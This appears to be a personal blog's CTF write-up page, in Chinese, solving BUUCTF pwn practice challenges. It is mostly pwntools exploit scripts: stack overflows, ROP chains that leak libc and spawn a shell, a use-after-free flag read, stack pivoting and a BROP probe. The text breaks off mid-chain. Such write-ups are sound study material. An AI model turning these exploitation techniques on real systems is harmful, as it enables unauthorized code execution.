@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>BUU-PWN题（81-??） | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="mrctf2020_easyoverflowfake_flag 是 n0t_r3@11y_f1@g                                                                                              image.png               程序 gets 到的是 v4（rbp-0x70），然后对比的 v5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU-PWN题（81-??）">
+<meta property="og:url" content="https://yichen115.github.io/2020/10/11/mtpgu8/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="mrctf2020_easyoverflowfake_flag 是 n0t_r3@11y_f1@g                                                                                              image.png               程序 gets 到的是 v4（rbp-0x70），然后对比的 v5">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602379692701-4986ab92-a581-4029-9772-d84cbc4352c5.png#align=left&display=inline&height=85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=120&originWidth=776&size=13777&status=done&style=none&width=551">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602379971069-2fde71b6-45bf-4449-bbf7-1eef98144db8.png#align=left&display=inline&height=402&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=581&size=38513&status=done&style=none&width=442">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602403722084-a96fb9a1-ebcd-42fd-9134-00f2a7cfd820.png#align=left&display=inline&height=328&margin=%5Bobject%20Object%5D&name=image.png&originHeight=459&originWidth=796&size=96713&status=done&style=none&width=569">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602403846706-4b9d9c41-bee6-43e3-a791-2b565655a758.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=229&originWidth=537&size=42019&status=done&style=none&width=461">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1604056285184-cb8da60a-331e-491c-86de-1986c7573a70.png#align=left&display=inline&height=613&margin=%5Bobject%20Object%5D&name=image.png&originHeight=758&originWidth=470&size=50164&status=done&style=none&width=380">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1604056480806-f482e951-6038-4f6b-80de-00ebae99c6c1.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=image.png&originHeight=121&originWidth=706&size=10362&status=done&style=none&width=666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1604056528441-830b1cf6-a7e4-427d-8455-43e56667bebd.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=142&originWidth=308&size=7113&status=done&style=none&width=289">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1604059465288-0926a92e-d9f2-4eac-b36a-1cf8631fe0c6.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=image.png&originHeight=342&originWidth=789&size=68331&status=done&style=none&width=600">
+<meta property="article:published_time" content="2020-10-11T01:18:12.000Z">
+<meta property="article:modified_time" content="2020-12-29T01:58:39.070Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1602379692701-4986ab92-a581-4029-9772-d84cbc4352c5.png#align=left&display=inline&height=85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=120&originWidth=776&size=13777&status=done&style=none&width=551">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">BUU-PWN题（81-??）</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">BUU-PWN题（81-??）</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-10-11T01:18:12.000Z" itemprop="datePublished" class="page-time">
+  2020-10-11
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#mrctf2020-easyoverflow"><span class="post-toc-number">1.</span> <span class="post-toc-text">mrctf2020_easyoverflow</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#jarvisoj-level5"><span class="post-toc-number">2.</span> <span class="post-toc-text">jarvisoj_level5</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#gyctf-2020-some-thing-exceting"><span class="post-toc-number">3.</span> <span class="post-toc-text">gyctf_2020_some_thing_exceting</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#actf-2019-babystack"><span class="post-toc-number">4.</span> <span class="post-toc-text">actf_2019_babystack</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#axb-2019-brop64"><span class="post-toc-number">5.</span> <span class="post-toc-text">[-]axb_2019_brop64</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#cmcc-pwnme2"><span class="post-toc-number">6.</span> <span class="post-toc-text">cmcc_pwnme2</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#picoctf-2018-can-you-gets-me"><span class="post-toc-number">7.</span> <span class="post-toc-text">picoctf_2018_can_you_gets_me</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#hitcontraining-unlink"><span class="post-toc-number">8.</span> <span class="post-toc-text">hitcontraining_unlink</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#picoctf-2018-got-shell"><span class="post-toc-number">9.</span> <span class="post-toc-text">picoctf_2018_got_shell</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#npuctf-2020-easyheap"><span class="post-toc-number">10.</span> <span class="post-toc-text">npuctf_2020_easyheap</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ciscn-2019-s-9"><span class="post-toc-number">11.</span> <span class="post-toc-text">ciscn_2019_s_9</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-mtpgu8"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">BUU-PWN题（81-??）</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-10-11 09:18:12" datetime="2020-10-11T01:18:12.000Z"  itemprop="datePublished">2020-10-11</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="mrctf2020-easyoverflow"><a href="#mrctf2020-easyoverflow" class="headerlink" title="mrctf2020_easyoverflow"></a>mrctf2020_easyoverflow</h1><p>fake_flag 是 n0t_r3@11y_f1@g</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602379692701-4986ab92-a581-4029-9772-d84cbc4352c5.png#align=left&display=inline&height=85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=120&originWidth=776&size=13777&status=done&style=none&width=551" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>程序 gets 到的是 v4（rbp-0x70），然后对比的 v5 是在 rbp-0x40，输入 0x30 个字符之后再输入就是与 fake flag 对比的了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602379971069-2fde71b6-45bf-4449-bbf7-1eef98144db8.png#align=left&display=inline&height=402&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=581&size=38513&status=done&style=none&width=442" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./mrctf2020_easyoverflow'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',26974)</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x30</span>+<span class="string">'n0t_r3@11y_f1@g'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-level5"><a href="#jarvisoj-level5" class="headerlink" title="jarvisoj_level5"></a>jarvisoj_level5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',28116)</span></span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'a'</span>*<span class="number">0x8</span></span><br><span class="line">rdi_add = <span class="number">0x4006b3</span></span><br><span class="line">rsir15_add = <span class="number">0x4006b1</span></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vul_add = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">payload1 = payload + p64(rdi_add) + p64(<span class="number">0x1</span>) + p64(rsir15_add) + p64(write_got) + <span class="string">'deadbeef'</span> + p64(write_plt) + p64(vul_add)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_add =libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload2 = payload + p64(rdi_add) + p64(binsh_add) + p64(sys_add)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><p>去申请的时候会先申请 0x10 大小的 chunk 来存放用户申请的 chunk 的指针，free 的时候没有置为 NULL，存在 UAF<br>在一开始的时候会把 flag 读到 0x6020A8 这里，只要能 show 这个地址的内容就行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602403722084-a96fb9a1-ebcd-42fd-9134-00f2a7cfd820.png#align=left&display=inline&height=328&margin=%5Bobject%20Object%5D&name=image.png&originHeight=459&originWidth=796&size=96713&status=done&style=none&width=569" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>一开始申请两个与 0x10 不一样大的，然后 free 掉，再去申请 0x10 大小的时候就会申请到那个存储指针的那里，修改指针为 bss 段放 flag 的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size1,content1,size2,content2)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"want to do :"</span>,<span class="string">"1"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"length : "</span>,str(size1))</span><br><span class="line">  p.sendlineafter(<span class="string">"ba : "</span>,content1)</span><br><span class="line">  p.sendlineafter(<span class="string">"length : "</span>,str(size2))</span><br><span class="line">  p.sendlineafter(<span class="string">"na : "</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"want to do :"</span>,<span class="string">"3"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"Banana ID : "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"what you want to do :"</span>,<span class="string">"4"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"SCP project ID : "</span>,str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">"yichen"</span>,<span class="number">0x20</span>,<span class="string">"writeup"</span>)</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">"yichen"</span>,<span class="number">0x20</span>,<span class="string">"writeup"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">flag_addr=<span class="number">0x6020A8</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x10</span>,p64(flag_addr),<span class="number">0x10</span>,p64(flag_addr))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602403846706-4b9d9c41-bee6-43e3-a791-2b565655a758.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=229&originWidth=537&size=42019&status=done&style=none&width=461" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h1><p>只能栈溢出 0x10 大小的，栈迁移<br>给出了写到的地址，一开始通过栈迁移执行 puts 函数来拿到函数的地址，从而获得 libc 的地址<br>然后再一次栈迁移执行 system 函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#p=remote("node3.buuoj.cn",27254)</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">main_addr = <span class="number">0x04008F6</span></span><br><span class="line">leave_ret = <span class="number">0x400A4E</span></span><br><span class="line">pop_rdi = <span class="number">0x0400ad3</span></span><br><span class="line">ret = <span class="number">0x400709</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"224"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">address = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">payload1 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0xd0</span>,<span class="string">'a'</span>)</span><br><span class="line">payload1 += p64(address<span class="number">-8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"224"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">address = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">payload2 = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">payload2 = payload2.ljust(<span class="number">0xd0</span>,<span class="string">'a'</span>)</span><br><span class="line">payload2 += p64(address<span class="number">-8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="axb-2019-brop64"><a href="#axb-2019-brop64" class="headerlink" title="[-]axb_2019_brop64"></a>[-]axb_2019_brop64</h1><p>如果不是 brop 的话只是一道经典的 ret2libc</p>
+<p>测试出缓冲区大小</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getsize</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">200</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25413</span>)</span><br><span class="line">            p.recvuntil(<span class="string">"Please tell me:"</span>)</span><br><span class="line">            p.send(i*<span class="string">'a'</span>)</span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Goodbye"</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> i<span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">size = getsize()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"size is [%s]"</span>%size</span><br></pre></td></tr></table></figure>
+
+<h1 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a>cmcc_pwnme2</h1><p>返回到 gets 函数，往 strings 那里写入 flag 的路径然后用 exec_string() 给读出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p = process("./pwnme2")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27892</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwnme2"</span>)</span><br><span class="line">gets_plt=elf.plt[<span class="string">'gets'</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0400963</span></span><br><span class="line">exec_string=<span class="number">0x80485CB</span></span><br><span class="line">string=<span class="number">0x804A060</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x6c</span>+<span class="string">'a'</span>*<span class="number">4</span>+p32(gets_plt)+p32(exec_string)+p32(string)</span><br><span class="line">p.sendlineafter(<span class="string">"input:\n"</span>,payload)</span><br><span class="line">p.sendline(<span class="string">'./flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h1><p>静态链接的程序，直接 rop chain<br>ROPgadget –binary pwn –ropchain</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#sh = process("./pwn")</span></span><br><span class="line">sh = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27195</span>)</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">'a'</span>*<span class="number">28</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; 